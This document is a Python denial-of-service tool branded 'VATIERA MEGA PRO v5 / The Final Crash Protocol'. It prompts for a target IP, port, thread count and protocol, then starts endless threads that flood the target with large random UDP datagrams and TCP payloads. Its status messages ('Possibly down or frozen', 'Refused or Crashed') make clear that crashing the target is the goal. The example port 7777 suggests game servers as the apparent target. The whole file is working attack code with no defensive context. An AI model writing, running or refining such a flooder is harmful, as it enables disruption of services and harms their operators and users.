import socket
import threading
import random
import os
import time

os.system("clear")
print("== VATIERA MEGA PRO v5 ==")
print("== The Final Crash Protocol ==")

ip = input(" Target IP: ")
port = int(input(" Main Port (e.g. 7777): "))
threads = int(input(" Threads (150+ recommended): "))
packets = int(input(" Packets per thread loop (e.g. 1000): "))
protocol = input(" Protocol Mode (udp / tcp / both): ").lower()

def mega_payload():
    entropy = random.getrandbits(8 * random.randint(1400, 2000))
    return entropy.to_bytes(len(bin(entropy)) // 8, 'big', signed=False)

def udp_universe():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(packets):
                payload = mega_payload()
                target_port = random.choice([port, port+1, port-1, random.randint(1024, 65500)])
                s.sendto(payload, (ip, target_port))
            print("[UDP-MEGA] Sent to", ip)
        except:
            print("[UDP] Possibly down or frozen")

def tcp_universe():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((ip, port))
            for _ in range(packets):
                payload = mega_payload()
                s.send(payload)
            s.close()
            print("[TCP-MEGA] Sent to", ip)
        except:
            print("[TCP] Refused or Crashed")

for _ in range(threads):
    if protocol == "udp":
        threading.Thread(target=udp_universe).start()
    elif protocol == "tcp":
        threading.Thread(target=tcp_universe).start()
    else:
        threading.Thread(target=udp_universe).start()
        threading.Thread(target=tcp_universe).start()
